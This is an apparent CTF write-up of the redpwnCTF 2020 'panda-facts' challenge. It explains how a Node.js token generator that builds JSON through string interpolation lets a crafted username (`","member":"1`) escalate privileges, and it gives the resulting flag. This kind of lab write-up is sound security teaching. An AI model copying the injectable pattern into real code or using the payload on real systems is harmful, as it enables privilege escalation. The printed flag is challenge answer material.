# panda-facts

Authors: [roerohan](https://github.com/roerohan), [thebongy](https://github.com/thebongy)

Maybe we can call this JSON injection?

# Requirements

- Basic knowledge of Node.js.

# Source

- [index.js](./index.js)
- https://panda-facts.2020.redpwnc.tf/

# Exploitation

```javascript
async function generateToken(username) {
    const algorithm = 'aes-192-cbc'; 
    const key = Buffer.from(process.env.KEY, 'hex'); 
    // Predictable IV doesn't matter here
    const iv = Buffer.alloc(16, 0);

    const cipher = crypto.createCipheriv(algorithm, key, iv);

    const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`

    let encrypted = '';
    encrypted += cipher.update(token, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return encrypted;
}
```

You really just need to notice this function. Notice, the token is not created like `token.username = username`. It's formed in the following way:

```
const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`
```

This allows us to close the `"` with the help of the string we pass, and set member to a non-zero value.
<br />

We can just pass the username as `","member":"1` and the visit `/api/flag`.

```
{
  "success": true,
  "flag": "flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}"
}
```

The flag is:

```
flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}
```